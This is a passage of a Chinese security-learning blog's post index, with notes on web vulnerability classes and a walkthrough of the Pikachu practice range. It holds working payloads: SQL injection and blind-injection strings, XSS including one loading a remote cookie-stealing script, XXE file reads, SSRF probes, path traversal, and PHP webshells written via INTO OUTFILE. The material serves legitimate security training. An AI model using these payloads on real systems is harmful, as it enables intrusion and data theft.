记录系统挂载设备\n/proc/config.gz     内核配置文件\n/proc/self/cmdline  当前进程的cmdline参数\n文件包含漏洞\n当 include, include_once, require, require_once 包含一个文件时，这个文件被作为php代码执行\n\n利用条件:\n\n网站对用户公开文件包含接口\n文件包含接口未做验证或验证不严格\n\n\n例如:\nphp&lt;?php\n    $file = $_GET[&#39;file&#39;];\n    if(file_exists($file))&#123;\n        include($file);\n    &#125;else&#123;\n        include(&#39;header.php&#39;);\n    &#125;\n?&gt;\n\n任意文件删除\n当网站存在删除文件操作且其中某些关键字段用户可控时，可能导致用户恶意构造删除某些网站甚至系统文件\n\n例如:\nphp/** do delete */\nif ($action == &#39;delete&#39;) &#123;\n    $bakfile = trim($_GET[&#39;file&#39;]);\n    $filepath = $DBak-&gt;datadir.$bakfile;\n\n    if (unlink($filepath)) &#123;\n        msgbox(&#39;文件删除成功！&#39;, $fileurl.&#39;?act=restore&#39;);\n    &#125; else &#123;\n        msgbox(&#39;文件删除失败！&#39;);\n    &#125;\n&#125;\n\n文件上传漏洞利用条件\n存在文件上传操作\n未对上传文件做校验\n用户可直接或间接访问到上传的文件并可执行\n\n例如:\nphp//DVWA\n&lt;?php\nif( isset( $_POST[ &#39;Upload&#39; ] ) ) &#123;\n    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;\n    $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );\n\n    if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) &#123;\n        echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;\n    &#125;\n    else &#123;\n        echo &quot;&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;&quot;;\n    &#125;\n&#125;\n?&gt;命令执行漏洞\n可以让攻击者总直接注入命令或恶意代码, 控制服务器后台\n\n远程系统命令执行\n原理: 系统上存在给用户提供特点的远程命令操作的接口(如ping), 但是没有严格的安全控制措施\n\n例如: \nphp&lt;?php\n    if (isset($_POST[&#39;host&#39;])) &#123;\n        $host = $_POST[&#39;host&#39;];\n        $res = shell_exec(&quot;ping -c 4 &#123;$host&#125;&quot;);\n        echo $res;\n    &#125;\n?&gt;\n此时如果输入127.0.0.1; ipconfig就会把后面的命令也执行\n\n\n越权漏洞\n由于没有对用户权限进行严格的判断, 导致低权限账号可以去完成高权限账号的操作\n属于逻辑漏洞, 是由于权限校验的逻辑不够严谨\n水平越权\n同等权限级别间\n服务器后台可能没有对用户权限做严格的判断, 可能导致一个用户能够执行另一个用户的操作\n\n\n垂直越权\n不同权限级别间\n先抓取超级管理员执行增加用户的数据包, 然后退出登录, 改为登录普通管理员的账号, 将获取到的数据包的请求头中的cookie替换为普通管理员的cookie, 在请求体中填入操作信息\n\n\n\n请求伪造跨站请求伪造CSRF\n通过伪装来自受信任用户的请求来利用受信任的网站\n\n确认是否存在CSRF漏洞\n判断请求是否可以被伪造\n确认凭证的有效期\n\nToken如何防止CDRF\n每次请求增加一个随机码, 后台每次对次进行验证\n\n服务端请求伪造SSRF\n由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统\n\n数据流:攻击者—–&gt;服务器—-&gt;目标地址\n形成原因\n服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。\n例如:\nphp&lt;?php\n    function curl($url)&#123;\n        $ch = curl_init();\n        curl_setopt($ch, CURLOPT_URL, $url);\n        curl_setopt($ch, CURLOPT_HEADER, 0);\n        curl_exec($ch);\n        curl_close($ch);\n&#125;\n$url = $_GET[&#39;url&#39;];\ncurl($url);\n?&gt;\n\n会话管理漏洞会话劫持\n获取用户Session ID后使用该Session ID进行伪装\n\n攻击步骤\n目标用户需要先登录站点\n\n登录成功后，该用户会得到站点提供的一个会话标识SessionID\n\n攻击者通过某种攻击手段捕获Session ID\n\n攻击者通过捕获到的Session ID访问站点即可获得目标用户合法会话\n#Session ID一般都设置在cookie中。\n\n\n会话固定\n诱骗受害者使用攻击者指定的会话标识\n\n原理\n访问网站时，网站会设置cookie中的session\n当用户登录后，cookie中的session保持不变\n只要获取登陆前的session内容，就可以知道登陆后的session\n\n","slug":"漏洞分类","date":"2024-02-14T08:23:14.000Z","categories_index":"","tags_index":"网络安全,学习日志,WEB攻防,漏洞分类","author_index":"Myprefer"},{"id":"a42e284740da93607374cf9810c61f9e","title":"Pikachu靶场实操","content":"Pikachu靶场实操暴力破解概述连续性尝试+字典+自动化\n字典\n常用的账号密码\n社工库\n算法生成\n\n暴力破解漏洞\n是否要求复杂密码\n是否使用安全的验证码\n是否进行次数限制\n是否采用双元素认证\n\n验证码\n防止登录暴力破解\n防止机器恶意注册\n\n测试流程\n确认登录接口的脆弱性\n比如:尝试登录–抓包–观察验证元素和response信息\n\n\n对字典进行优化\n根据注册提示信息进行优化\n管理员\n\n\n工具自动化操作\n\nPikachu关卡基于表单的暴力破解此关没有设置验证码等防范措施, 使用Brup Suite的Intruder功能, 如果response中没有username or password is not exists可以说明破解成功\n步骤:\n\n尝试手动提交表单, 使用brupsuite拦截\n发送到Intruder, 关闭拦截, 配置好payload和字典, 开始进行破解(Cluster bomb)\n对结果按照长度或有无username or password is not exists进行整理, 发现test&#x2F;abc123和admin&#x2F;123456可能是正确的, 验证后,可以确认破解成功\n\n验证码绕过(on server)验证码在后端会进行验证, 但是验证码可以被重复利用, 因此可以手动输入正确的验证码, 然后一直利用该验证码进行破解, 其余操作同上\n\n\n原因: php中 session默认的过期时间为1440秒, 后端没有对此进行设置, 因此这段时间内验证码可以一直用\n\n验证码绕过(on client)验证码只能在前端限制客户端发包, 非常容易解除, 没有很好的验证效果, 其余操作同上\ntoken防爆破由于token已经出现在前端代码中, 因此我们可以轻易获取, 我先猜测用户名为admin, 然后通过音叉模式结合字典和从响应中获取的token进行暴破\n\nXSS跨站脚本概述测试流程\n在目标站点上找到输入点, 比如查询接口, 留言板等\n输入一组“特殊字符+唯一识别字符”，点击提交后,查看返回的源码，是否有做对应的处理\n通过搜索定位到唯一字符，结合唯一字符前后语法确认是否可以构造执行js的条件(构造闭合);\n提交构造的脚本代码(以及各种绕过姿势)，看是否可以成功执行，如果成功执行则说明存在XSS漏洞;\n\ntips\n一般查询接口容易出现反射型XSS，留言板容易出现存储型XSS\n由于后台可能存在过滤措施,构造的script可能会被过滤掉，而无法生效,或者环境限制了执行(浏览器);\n通过变化不同的script，尝试绕过后台过滤机制;\n\n反射型xss(GET与POST)\nGET型可以用伪装后的url, 更容易攻击\n\nXSS绕过\n转换\n大小写&lt;ScRipT&gt;\n拼凑&lt;scr&lt;script&gt;ipt&gt;\n注释&lt;sc&lt;!--a--&gt;ript&gt;\n\n\n编码\nurl编码\nhtml编码\n\n\n\nhtmlspecialchars()函数htmlspecialchars()函数把预定义的字符转换为HTML实体。\n\n\n\n\n\n\n\n\n\n&amp;(和号)成为&amp;amp“(双引号)成为&amp;quot‘(单引号)成为&amp;#039&lt;(小于)成为&amp;lt‘&gt;’(大于)成为&amp;gt\nPikachu关卡反射型xss(get)php$html.=&quot;&lt;p class=&#39;notice&#39;&gt;who is &#123;$_GET[&#39;message&#39;]&#125;,i don&#39;t care!&lt;/p&gt;&quot;;源码没有对message进行任何检查和过滤\n解除前端输入限制后输入&lt;/p&gt;&lt;script&gt;alert();&lt;/script&gt;&lt;p&gt;即可\n\n反射型xss(post)一次性,会与服务端交互,输入&lt;/p&gt;&lt;sCRiPt sRC=//uj.ci/pq7&gt;&lt;/sCrIpT&gt;&lt;p&gt;成功打到cookie\n存储型xss同样没有检查和过滤, 每次刷新都会加载一遍, 输入同上\nDOM型xss输入的内容会被填入超链接输入&#39; onclick=&#39;alert()然后点击超链接链接:\nDOM型xss-x输入内容同上, 点击第二个出现的超链接运行, 类似于get反射型xss, 可以通过url攻击\nxss之盲打我留言的内容在后台显示到管理员界面, 因此输入&lt;/td&gt;&lt;script&gt;alert();&lt;/script&gt;&lt;td&gt;, 管理员进入后台后就会被弹窗\nxss之过滤&lt;script会被过滤掉, 但是换成大写就不会, 比如&lt;ScriPt&gt;alert();&lt;/SCripT&gt;\nxss之htmlspecialchars单引号&#39;没有被处理, 因此可以输入#&#39; onclick=alert();&#39;\nxss之herf输出这关没有在后端限制只能输入url因此可以填入js代码javascript:alert()\nxss之js输出关于输入的源码如下:\nhtml&lt;script&gt;\n    $ms=&#39;432&#39;;\n    if($ms.length != 0)&#123;\n        if($ms == &#39;tmac&#39;)&#123;\n            $(&#39;#fromjs&#39;).text(&#39;tmac确实厉害,看那小眼神..&#39;)\n        &#125;else &#123;\n//            alert($ms);\n            $(&#39;#fromjs&#39;).text(&#39;无论如何不要放弃心中所爱..&#39;)\n        &#125;\n\n    &#125;\n&lt;/script&gt;可以在$ms=&#39;432&#39;构造闭合, 输入tmac&#39;&lt;/script&gt;&lt;script&gt;alert();&lt;/script&gt;\nCSRF(跨站请求伪造)概述\n通过伪装来自受信任用户的请求来利用受信任的网站\n\n与XSS的区别\nXSS可以拿到用户的权限(盗取cookie), 然后实施破坏\nCSRF借用户的权限进行攻击, 而没有拿到用户的权限\n\n确认是否存在CSRF漏洞\n判断请求是否可以被伪造\n确认凭证的有效期\n\nToken如何防止CDRF\n每次请求增加一个随机码, 后台每次对次进行验证\n\nPikachu关卡CSRF(get)\n假设攻击者是Allen, 可以得到修改信息提交表单时的url为http://192.168.1.9:7071/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=13676767767&amp;add=nba+767&amp;email=allen%40pikachu.com&amp;submit=submit\n\n假设攻击目标是vince, 已知他目前的个人信息为:\n\n\n\n\n\n\n\n\n\n姓名:vince\n性别:boy\n手机:18626545453\n住址:chain\n邮箱:&#x76;&#105;&#x6e;&#99;&#101;&#x40;&#x70;&#x69;&#x6b;&#97;&#x63;&#x68;&#x75;&#x2e;&#x63;&#111;&#x6d;\n\n要把他的个人信息中的地址修改为moon, 那么可以伪造一个链接http://192.168.1.9:7071/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=18626545453&amp;add=moon&amp;email=vince%40pikachu.com&amp;submit=submit\n\n让vince点击这个链接, 就可以利用vince的权限, 向web发出请求, 修改个人信息\n\n\nCSRF(post)\npost请求中, 表单不在url中, 而在请求体中, 这时可以伪造一个站点, 让vince给伪造站点发出请求, 把请求中的参数进行修改, 向真正的站点提交post请求\n在伪造站点(钓鱼网站)中, 我在表单添加一个action, 让表单提交到真正的网站上&lt;form actiom=&quot;http://192.168.1.9:7071/vul/csrf/csrfpost/csrf_post_edit.php&quot; method=&quot;post&quot;&gt;\n在vince点击提交时, 将vince的信息进行修改, 即可达成目的\n\nCSRF TokenSQL注入概述\n攻击者可以通过合法输入点提交一些精心构造的语句, 从而欺骗后台数据库对其进行执行, 导致数据库信息泄露\n\n例如:正常输入: 1, 执行select password from users where id=1非法输入:1 or 1=1, 执行select password from users where id=1 or 1=1;后者会输出表中的所有password\n\n\n攻击流程\n注入点探测(自动&#x2F;手动)\n\n判断注入点类型\n判断查询列数\n判断显示位置\n\n\n信息获取\n\n获取所有数据库名\n\n\n\n\n\n\n\n\n\n一次性显示全部:group_concat(字段名)\n逐一显示: limit\n\n获取某数据库所有表名\n\n获取某库某表中所有字段名\n\n获取字段的数据\n\n\n\n获取权限\n\n\n注入点类型\n数字型\n字符型: &#39;xxx&#39;\n搜索型: %xxx%\n\n根据类型进行构造闭合\n基于union联合查询的信息获取\n查询列数必须相同\n\n判断查询列数\norder by: 按照指定字段名进行排序\n\n基于报错信息获取\n使用一些指定的函数来制造报错, 从报错信息中获取特定的信息\n背景条件: 后台没有屏蔽报错信息, 在语法发生错误时会输出在前端\n\n报错函数\nupdatexml()\nsqlupdatexml(xml_document, XPathstring, new_value)\n#第一个参数: 表中的字段名(字符串)\n#第二个参数:Xpath格式的字符串\n#String格式，替换查找到的符合条件的**”XPath定位必须是有效的, 否则会发送错误”**可以利用这一点制造报错信\n例如updatexml(1,concat(0x7e,database(),0))会产生报错信息, 其中有database()执行的结果\n\nextractvalue()\nsqlextractvalue(xml_document, xpath_string)\n#同样通过xpath产生报错\nfloor()取整函数, 示例:\nsqlxxx&#39; and (select 2 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)#\n\n盲注\n后台屏蔽了报错信息, 无法根据报错进行注入的判断  \n分类\n基于真假, 例:vince&#39; and ascii(substr(database(),1,1))=112#\n基于时间, 例:vince&#39; and if((ascii(substr(database(),1,1)))=112,sleep(5),null)#\n\n\n通过ascii(substr((xx语句), n, n))=x判断\n\n宽字节注入Pikachu关卡数字型注入(post)\n表单内容在前端进行了限制, 但是很容易解除, 比如可以抓包然后进行修改, 下图将原本提交的1修改为1 or 1=1\n\n提交后, 可以看到所有的用户都被查询成功\n\n\n字符型注入(get)\n构造闭合即可, 先对站点进行测试, 可先传入一些特殊字符比- 如&#39;, &quot;, %等, 下面是输入单引号&#39;的结果,\n\n测试发现其后端对查询语句的处理是用单引号&#39;进行包裹的,因此可以用单引号构造闭合, 例如, 输入&#39; or 1=1;#, 同样可以搜索到所有用户,  其中, #对将后面的内容注释掉防止报错\n\n\n搜索型注入\n测试发现可以用%&#39;构造闭合, 且输入#%&#39; or 1=1 order by 3;#显示正常,, 但是输入#%&#39; or 1=1 order by 4;#显示异常, 说明总共有三列\n\n输入#%&#39; and id=1 union select user(),database(),version();#获取到一些数据库信息\n\n\n\nxx型注入\n输入&#39;:\n\n通过报错信息的提示可以推断, 应按照(&#39;xx&#39;)构造闭合\n\n\n“insert&#x2F;update”注入\n*insert\n\n正常没有回显, 但是可以通过报错获取信息\n\npayload:xxx&#39; or updatexml(1,concat(0x7e,user()),0) or &#39;获取到user信息:\n\n\n\nupdate\n\npayload和insert相同\n\n\n\n“delete注入”\n分析: 根据抓包得到的信息可以发现, 执行删除操作时会向服务器发送一个get请求, 请求中含有要删除内容的数字id,推测在后端有语句delete from xxx where id=78\n\n因此可以在此次插入sql语句or updatexml(1,concat(0x7e,xxx),0) 制造报错, 从而获取信息\n\n\n“http header”注入\n根据登录后的页面可以得知, 后端对请求头的数据进行了处理, 可以尝试在请求头中插入sql语句\n\n将UA头修改为Firefox&#39; or updatexml(1, concat(0x7e, database()) ,0) or &#39;#\n得到\n\n\n盲注(base on boolean)\n后端可能对报错进行了过滤, 导致没有回显, 但是输入vince&#39; and 1=1#显示\n输入vince&#39; and 1=2#\n根据这点不同可以获取到信息,比如payload为vince&#39; and ascii(substr(database(),1,1))=112#时显示第一种情况, 说明database名的第一个字符为p, 根据这个原理可以不断的尝试直到获取到所有信息\n但是手动操作非常的麻烦, 可以使用自动化工具sqlmap进行操作获取当前数据库名:py .\\sqlmap.py -u &quot;http://192.168.5.133:7090/vul/sqli/sqli_blind_b.php?name=1234&amp;submit=%E6%9F%A5%E8%AF%A2&quot; --current-db\n\n获取到数据库名为pikachu\n以此类推可以获取到更多信息\n\n盲注(base on time)\n没有回显, 甚至输入什么都一样, 无法通过前面的基于真假进行判断有无sql注入漏洞\n但是输入vince加载只花了80毫秒左右, 而输入vince&#39; and sleep(5)#却确实花了5秒左右\n说明sleep(5)确实作为一个sql语句被执行了, 这里存在sql注入漏洞, 结合基于真假的盲注的原理, 可以构造payload:vince&#39; and if((ascii(substr(database(),1,1)))=112,sleep(5),null)#\n同样也是5秒后才加载完成, 说明数据库名的第一个字符为p, 也可以使用sqlmap进行自动化操作\n\n宽字节注入\n后端对输入的内容进行了转义, &#39;转义为\\&#39;使原本的payloadvince&#39; or 1=1 ;#无法使用\n由于mysql使用gbk编码, 单引号转义后编码为%5c%27, 如果在单引号前面输入%df使其变成%df%5c%27前面的%df%5c就会被解析为一个汉字, 单引号%27就成功逃逸了, 实现了闭合\npayload修改为vince%df&#39; or 1=1;#\n\n越权漏洞概述\n由于没有对用户权限进行严格的判断, 导致低权限账号可以去完成高权限账号的操作\n\n属于逻辑漏洞, 是由于权限校验的逻辑不够严谨\n\n水平越权\n\n同等权限级别间\n\n\n垂直越权\n\n不同权限级别间\n\n\n\nPikachu关卡水平越权\n登录lucy账号, 然后点击”查看个人信息”的时候会发送一个get请求:http://192.168.1.9:7071/vul/overpermission/op1/op1_mem.php?username=lucy&amp;submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF\n\n服务器后台可能没有对用户权限做严格的判断, 可能导致一个用户能够查看另一个用户的信息\n\n在登录lucy账号之后, 将上面get请求中的lucy改为其他用户名(比如lili), 发现可以访问\n\n\n垂直越权\n这关里pikachu是普通管理员, admin是超级管理员, 其中只有超级管理员能够执行增加用户的操作\n\n先抓取超级管理员执行增加用户的数据包, 然后退出登录, 改为登录普通管理员的账号, 将获取到的数据包的请求头中的cookie替换为pikachu的cookie, 在请求体中填入增加用户的信息\n\n\n\nRCE-命令执行漏洞概述\n可以让攻击者总直接注入命令或恶意代码, 控制服务器后台\n\n远程系统命令执行\n原理: 系统上存在给用户提供特点的远程命令操作的接口(如ping), 但是没有严格的安全控制措施\n\n例如: \nphp&lt;?php\n    if (isset($_POST[&#39;host&#39;])) &#123;\n        $host = $_POST[&#39;host&#39;];\n        $res = shell_exec(&quot;ping -c 4 &#123;$host&#125;&quot;);\n        echo $res;\n    &#125;\n?&gt;\n此时如果输入127.0.0.1; ipconfig就会把后面的命令也执行\n\n\nPikachu关卡ping-远程系统命令执行\n可使用|, ||, &amp;等进行拼接, 估计没做过滤处理\n\neval-远程代码执行\n根据提示, 后台大概是使用了eval()函数\n\n尝试输入phpinfo();, 查看是否可以执行代码\n\n证明可以执行任意代码, 通过hackbar得知key为txt, 使用蚁剑尝试连接\n\n\n拿下webshell\n\n\n文件包含漏洞概述\ninclude()，require()，include_once()，require_once()会解析执行php文件\n在allow_url_include, allow_url_fopen为on时还可以通过url地址对远程的文件进行包含, 一般会配合伪协议\n\nPikachu关卡本地文件包含\n通过观察url, 有一个参数为fileX.php, X为1~5\n\n尝试用别的文件, 比如file6.php\n\n可以看到解析了file6.php的内容, 获取了一些信息\n\n\n远程文件包含\n除了本地文件包含, 还可以通过http协议或php伪协议进行包含, 例如通过php://filter/read进行源码的获取\n\n解码后可获取源码\n\n\n不安全的文件下载概述\n在下载功能中, 如果攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。\n\nPikachu关卡\n下载链接如下:http://192.168.5.143:7090/vul/unsafedownload/execdownload.php?filename=kb.png\n\n尝试将文件kb.png改为其它路径的文件,比如当前页面的文件../down_nba.php, 发现可以下载\n\n以此类推, 几乎所有文件都可以下载, 比如C盘中的系统配置文件system.inihttp://192.168.5.143:7090/vul/unsafedownload/execdownload.php?filename=../../../../../../Windows/system.ini\n\n\n文件上传漏洞概述\n通用漏洞-文件上传| Myprefer’s Blog\n\nPikachu关卡客户端check\n只在客户端检查, 修改js或抓包改包即可绕过\n\n服务端check\n抓包, 将其中的文件类型改为image&#x2F;jpeg即可\n\ngetimagesize()\ngetimagesize()函数会获取图片信息, 需要伪造图片马才能绕过\n\n用命令copy tmp.png/b+eval.php 1.jpg生成图片马\n\n\n可以看到一句话木马拼接到了jpg文件中\n\n上传后, 由于木马文件为jpg后缀, 无法直接执行, 但可以结合文件包含漏洞使用:http://192.168.1.5/pikachu/vul/fileinclude/fi_local.phpfilename=file:///C:\\phpstudy_pro\\WWW\\pikachu\\vul\\unsafeupload\\uploads\\1.jpg\n\n\n目录遍历概述\n在 Web 功能设计中，很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活， 当用户发起一个前端的请求时，便会将请求的这个文件的值（比如文件名称）传递到后台，后台再执行其对应的文件\n\n在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过../这样的手段让后台打开或者执行一些其他的文件，从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞\n\n\nPikachu关卡\ntitle参数可通过../进入任意目录, 造成信息泄露, 比如读取system.ini文件信息\n\n敏感信息泄露概述\n由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到\n通过访问url下的目录，可以直接列出目录下的文件列表\n报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;\n前端源码里面包含了敏感信息\n\n\n\nPikachu关卡\n前端代码中泄露了敏感信息\n\nPHP反序列化概述\nWEB攻防-反序列化 | Myprefer’s Blog\n\nPikachu关卡\n此漏洞利用需要代码审计,  漏洞代码:\nphpclass S&#123;\n    var $test = &quot;pikachu&quot;;\n    function __construct()&#123;\n        echo $this-&gt;test;\n    &#125;\n&#125;\n\n$html=&#39;&#39;;\nif(isset($_POST[&#39;o&#39;]))&#123;\n    $s = $_POST[&#39;o&#39;];\n    if(!@$unser = unserialize($s))&#123;\n        $html.=&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;;\n    &#125;else&#123;\n        $html.=&quot;&lt;p&gt;&#123;$unser-&gt;test&#125;&lt;/p&gt;&quot;;\n    &#125;\n\n&#125;\n据此生成payload的代码\nphp&lt;?php\nclass S&#123;\n    var $test = &quot;123333&quot;;\n&#125;\n$a = new S();\necho serialize($a);\n?&gt;\n\n发现可以用来构造xss, 比如O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:25:&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;;&#125;\n\n\nXXE-xml外部实体注入漏洞概述\nXXE：XML External Entity attack（XML外部实体攻击）。其实XXE就是攻击者自定义了XML文件进行了执行\n\nXML&amp;DTD\nXML(Extensible Markup Language)，全称为可扩展标记语言，是一种传输的数据格式\nDTD(Document Type Definition),全称为文档类型定义，是XML文档中的一部分，用来定义元素, 对xml文档定义语义约束。\n\nXML结构xml&lt;!--第一部分: XML声明--&gt;\n&lt;?xml version=&quot;1.0&quot;?&gt;\n\n&lt;!--第二部分: 文档类型定义DTD--&gt;\n&lt;!DOCTYPE note [ \n&lt;!ENTITY entity-name SYSTEM &quot;URL/URL&quot; &gt;\n]&gt;\n\n&lt;!--第三部分: 文档元素--&gt;\n&lt;note&gt;\n&lt;to&gt;123&lt;/to&gt;\n&lt;from&gt;abc&lt;/from&gt;\n&lt;head&gt;xyz&lt;/head&gt;\n&lt;body&gt;hhhh&lt;/body&gt;\n&lt;/note&gt;外部实体引用payloadxml&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;\n&lt;!DOCTYPE ANY [ \n&lt;!ENTITY SYSTEM &quot;file:///flag&quot; &gt;\n]&gt;\n&lt;x&gt;&amp;f;&lt;/x&gt;Pikachu关卡\npayload:\ntxt&lt;?xml version = &quot;1.0&quot;?&gt;\n&lt;!DOCTYPE ANY [\n    &lt;!ENTITY f SYSTEM &quot;file:///Windows/system.ini&quot;&gt;\n]&gt;\n&lt;x&gt;&amp;f;&lt;/x&gt;\n可以读取任意文件\n\n\n不安全的url跳转概述\n如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的url地址)参数作为了跳转的目的地,而又没有做判断的话, 就可能发生”跳错对象”的问题。\n危害: 钓鱼\n\nPikachu关卡\n点击第三句话时会进行一个跳转, 正确的跳转应该是转到概述页面, 发现网页通过参数url确定跳转目标http://192.168.5.146:7090/vul/urlredirect/urlredirect.php?url=unsafere.php\n这里参数url可以改成任意url, 比如url=https://google.com, 可跳转到对应网页, 可用于钓鱼攻击\n\nSSRF-服务端请求伪造概述\n服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制\n\n数据流: 攻击者–&gt;服务器–&gt;目标地址\n\n\n产生SSRF漏洞的函数\nfile_get_contents\n  从指定url读取文件:\nphp$content = file_get_contents($_POST[&#39;url&#39;]); \nfsockopen\ntxt$fp = fsockopen($host, intval($port), $errno, $errstr, 30); \ncurl_exec\nphp$link = $_POST[&#39;url&#39;];\n$curlobj = curl_init();\ncurl_setopt($curlobj, CURLOPT_POST, 0);\ncurl_setopt($curlobj,CURLOPT_URL,$link);\ncurl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);\n$result=curl_exec($curlobj);\n\n还可以使用伪协议\nPikachu关卡\n使用了curl_exec()函数发送请求, 可以用来探测内网信息, 比如探测3306端口:http://192.168.5.146:7090/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1:3306\n\n\n利用file协议读取任意服务器文件:http://192.168.5.146:7090/vul/ssrf/ssrf_curl.php?url=file:///C:/Windows/system.ini\n\n\n利用dict协议扫描内网主机开放端口:\n\n\n","slug":"Pikachu靶场实操","date":"2024-02-04T01:57:16.000Z","categories_index":"","tags_index":"网络安全,学习日志","author_index":"Myprefer"},{"id":"38e97d07cb4887821026c06ecc181448","title":"小迪安全-P4","content":"加密识别(猜测)算法编码类型\n看密文位数\n看密文的特征(数字,  字母,  大小写,  符号等)\n看当前密文存在的地方(Web,  数据库,  操作系统等应用)\n\n获取 ( 猜测到 )加密算法后就 ( 可能 ) 可以进行解密\n加密平台md5在线解密破解\n在线DES加密解密、DES在线加密解密)\n总结30余种加密编码类型的密文特征分析（建议收藏） (qq.com)\nCTF中常见密码题解密网站总结_CTF解密网站-CSDN博客\n","slug":"小迪安全-P4","date":"2024-02-03T12:01:45.000Z","categories_index":"","tags_index":"网络安全,学习日志,小迪安全,基础入门","author_index":"Myprefer"},{"id":"b01c54bfa7b8abe9af0697abfd45eff9","title":"第四次课程-XSS与SQL注入","content":"XSS基础介绍XSS过滤绕过总结 - 随风kali - 博客园 (cnblogs.com)\n\n跨站脚本，英文全称：Cross-Site Scripting\n\n通过输入可以被解析的特殊字符串, 如\nhtml&lt;/p&gt;&lt;script&gt;alert(&#39;this is an alart&#39;);&lt;/script&gt;&lt;p&gt;其中script标签内的代码会被执行\n\n分类: 反射型XSS, 储存型XSS, DOM型XSS\n\n反射型XSS\n\n执行流程:\n\n\n\n\n\n\n\n\n\n1、在输入点输入内容，构造恶意代码，输入点是以GET方式提交的，我们可以在URL中看到输入的内容2、后端接收提交的数据，并没有对输入进行过滤3、然后就将其呈现给了前端，浏览器执行了恶意代码\n\n\n\n存储型XSS\n\n存储型XSS和反射型XSS区别就在于，存储型XSS是将恶意构造的代码存储在了数据库\n\n执行流程:\n\n\n\n\n\n\n\n\n\n1、在留言板处输入内容，构造恶意代码2、将输入的内容，提交给后端代码执行，后端对输入过滤不严格，然后执行插入(insert)数据库操作3、此时，我们的恶意代码已经保存在了数据库，4、不管何时何地何人查看这条留言，都会被执行恶意代码，除非数据库中删除这条恶意代码\n\n\n\nDOM型XSS\n\n基于文档对象模型的漏洞，可以动态的构造DOM节点\n不经过后端代码，直接构造恶意代码，即可在前端展示\n\n\n\n\n练习:alert(1) (haozi.me)\n\n\n\nSQL注入文章推荐\nweb渗透【11】phpmyadmin写shell的三种方法-CSDN博客\n\nSQL注入总结 | Lucky Future的技术栈\n\nVULOnceMore&#x2F;战术技巧&#x2F;SQL注入利用总结\n\n\n概述\n攻击者可以通过合法输入点提交一些精心构造的语句, 从而欺骗后台数据库对其进行执行, 导致数据库信息泄露\n\n例如:正常输入: 1, 执行select password from users where id=1非法输入:1 or 1=1, 执行select password from users where id=1 or 1=1;后者会输出表中的所有password\n\n\n攻击流程\n注入点探测(自动&#x2F;手动)\n\n判断注入点类型\n判断查询列数\n判断显示位置\n\n\n信息获取\n\n获取所有数据库名\n\n\n\n\n\n\n\n\n\n一次性显示全部:group_concat(字段名)\n逐一显示: limit\n\n获取某数据库所有表名\n\n获取某库某表中所有字段名\n\n获取字段的数据\n\n\n\n获取权限\n\n\n注入点类型\n数字型\n字符型: &#39;xxx&#39;\n搜索型: %xxx%\n\n根据类型进行构造闭合\n基于union联合查询的信息获取\n查询列数必须相同\n\n判断查询列数\norder by: 按照指定字段名进行排序\n\n基于报错信息获取\n使用一些指定的函数来制造报错, 从报错信息中获取特定的信息\n背景条件: 后台没有屏蔽报错信息, 在语法发生错误时会输出在前端\n\n报错函数\nupdatexml()\nsqlupdatexml(xml_document, XPathstring, new_value)\n#第一个参数: 表中的字段名(字符串)\n#第二个参数:Xpath格式的字符串\n#String格式，替换查找到的符合条件的**”XPath定位必须是有效的, 否则会发送错误”**可以利用这一点制造报错信\n例如updatexml(1,concat(0x7e,database(),0))会产生报错信息, 其中有database()执行的结果\n\nextractvalue()\nsqlextractvalue(xml_document, xpath_string)\n#同样通过xpath产生报错\nfloor()取整函数, 示例:\nsqlxxx&#39; and (select 2 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)#\n\n盲注\n后台屏蔽了报错信息, 无法根据报错进行注入的判断  \n分类\n基于真假, 例:vince&#39; and ascii(substr(database(),1,1))=112#\n基于时间, 例:vince&#39; and if((ascii(substr(database(),1,1)))=112,sleep(5),null)#\n\n\n通过ascii(substr((xx语句), n, n))=x判断\n\n进行远程控制\n远程代码执行\n\nsqlvince&#39; union select &quot;&lt;?php @eval($_GET[&#39;test&#39;])?&gt;&quot;,2 into outfile &quot;/var/www/html/1.php&quot;#\n远程漏洞执行\n\nsqlvince&#39; union select &quot;&lt;?php system($_GET[&#39;cmd&#39;])?&gt;&quot;,2 into outfile &quot;/var/www/html/2.php&quot;#跨库查询说明\n在权限较大时才可以进行跨库查询\n\n查询库\nSELECT SCHENA_NAME from information_schema.SCHEMATA limit n, 1;查询第n个(下标从0开始)库的名字\n输出:\nsql+-------------+\n| schema_name |\n+-------------+\n| myprefer    |\n+-------------+\n\n查询表\nselect table_name from information_schema.`TABLES` where 